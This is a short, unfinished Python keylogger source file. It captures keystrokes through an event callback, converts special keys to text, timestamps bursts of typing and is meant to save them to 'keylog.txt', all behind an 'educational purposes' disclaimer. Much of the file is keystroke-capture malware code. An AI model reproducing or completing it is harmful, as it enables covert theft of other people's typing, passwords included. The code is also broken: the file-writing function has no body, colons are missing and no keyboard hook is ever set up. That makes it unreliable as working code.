import time
from datetime import datetime
# This is a simple keylogger that logs keystrokes to a file.
# This code is just for educational pruposes as well as to test my skills as a programmer.
# DO NOT USE THIS CODE FOR MALICIOUS PURPOSES. I AM NOT RESPONSIBLE FOR ANY DAMAGE CAUSED BY THIS CODE. USE IT AT YOUR OWN RISK.


# Now this is the Configuration.

log_file = "keylog.txt"
keys = []
last_key_time = time.time()
running = True


def write_to_file()

# This function writes the logged keys to a file. TBD


def on_key_press(event):
    """Callback function when a key is pressed"""
    global keys, last_key_time
    key = event.name
    #  this is for handling special keys
    if key == "space"
        key = " "
    elif key == "enter":
        key = "\n"
    elif key == "tab":
        key = "\t"
    elif key == "backspace":
        key = "[BACKSPACE]"
    elif len(key) > 1:  #  so for other special keys like  (ctrl, shift, etc.)
        key = f"[{key.upper()}]"

    # Add timestamp for first key after a pause
    if not keys or time.time() - last_key_time > 5:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        keys.append(f"\n[{timestamp}] ")

    keys.append(key)
    last_key_time = time.time()

    # Write to file every 50 keystrokes
    if len(keys) % 50 == 0:
        write_to_file()
